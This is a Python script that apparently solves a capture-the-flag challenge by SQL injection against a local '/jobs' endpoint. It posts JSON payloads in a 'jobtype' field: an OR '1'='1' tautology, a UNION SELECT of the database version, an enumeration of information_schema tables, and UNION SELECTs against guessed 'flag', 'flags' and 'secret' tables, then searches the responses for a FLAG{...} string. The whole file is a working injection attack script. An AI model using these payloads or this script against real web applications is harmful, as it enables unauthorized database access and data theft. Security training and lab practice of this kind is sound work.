import requests
import json
import re
import time

# Target configuration
TARGET_URL = "http://127.0.0.1:8000/jobs"

print("[+] Starting SQL Injection Testing")
print(f"[+] Target: {TARGET_URL}")
print("[+] Parameter: jobtype")
print()

# Simple test to confirm connection
print("=" * 50)
print("CONNECTION TEST")
print("=" * 50)

try:
    # First test basic connectivity with normal data
    normal_data = {"jobtype": "engineer"}
    headers = {'Content-Type': 'application/json'}
    
    print(f"[+] Testing normal request...")
    print(f"[+] Payload: {normal_data}")
    
    response = requests.post(TARGET_URL, 
                           headers=headers, 
                           data=json.dumps(normal_data),
                           timeout=30)
    
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text[:500]}...")
    print()
    
except Exception as e:
    print(f"[!] Connection error: {e}")
    print(f"[!] Target may be unreachable")

# Test SQL injection
test_payloads = [
    # Basic or test
    "test' OR '1'='1",
    
    # Try to extract version
    "test' UNION SELECT @@version-- ",
    
    # Try to get table names (assuming 5 columns based on common patterns)
    "test' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- ",
    
    # Try to get flag from table with 5 columns
    "test' UNION SELECT flag,2,3,4,5 FROM flag-- ",
    
    # Try flags table
    "test' UNION SELECT flag,2,3,4,5 FROM flags-- ",
    
    # Try secret table
    "test' UNION SELECT secret,2,3,4,5 FROM secret-- ",
]

print("=" * 50)
print("SQL INJECTION TESTS")
print("=" * 50)

for i, payload in enumerate(test_payloads, 1):
    print(f"\n[+] Test {i}: {payload}")
    
    try:
        data = {"jobtype": payload}
        headers = {'Content-Type': 'application/json'}
        
        response = requests.post(TARGET_URL,
                               headers=headers,
                               data=json.dumps(data),
                               timeout=30)
        
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Length: {len(response.text)} bytes")
        
        if len(response.text) < 1000:
            print(f"[+] Response: {response.text}")
        else:
            print(f"[+] Response: {response.text[:800]}...")
        
        # Check for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        if flag_match:
            print(f"\n{'='*50}")
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"{'='*50}")
            break
        
        # Check for database info
        if "5." in response.text or "8." in response.text or "10." in response.text:
            if "MySQL" in response.text or "mariadb" in response.text.lower():
                print("[+] Database version detected!")
        
        time.sleep(1)  # Rate limiting
        
    except Exception as e:
        print(f"[!] Error: {e}")
        time.sleep(2)  # Wait longer on error

print("\n" + "=" * 50)
print("COMPLETED")
print("=" * 50)
